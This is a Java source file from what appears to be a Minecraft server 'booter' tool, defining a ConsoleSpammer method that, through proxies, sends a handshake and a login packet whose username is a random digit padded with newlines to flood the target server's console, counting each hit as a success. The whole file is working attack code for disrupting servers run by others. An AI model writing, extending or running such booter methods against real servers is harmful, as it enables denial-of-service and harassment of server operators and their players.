package me.nzxtercode.nettybooter.methods.impl;

import java.security.SecureRandom;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import me.nzxtercode.nettybooter.NettyBooter;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.packets.Handshake;
import me.nzxtercode.nettybooter.packets.LoginRequest;
import me.nzxtercode.nettybooter.proxy.ProxyManager;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Console spammer.
 */
public class ConsoleSpammer implements IMethod {
	private final Handshake handshake = new Handshake(NettyBooter.protocolID, NettyBooter.srvRecord, NettyBooter.port,
			2);

	private final byte[] bytes = this.handshake.getWrappedPacket();

	public void accept(Channel channel, ProxyManager.Proxy proxy) {
		channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
		channel.writeAndFlush(Unpooled.buffer()
				.writeBytes((new LoginRequest(new SecureRandom().nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
						.getWrappedPacket())));
		NettyBootstrap.success++;
		channel.close();
	}
}
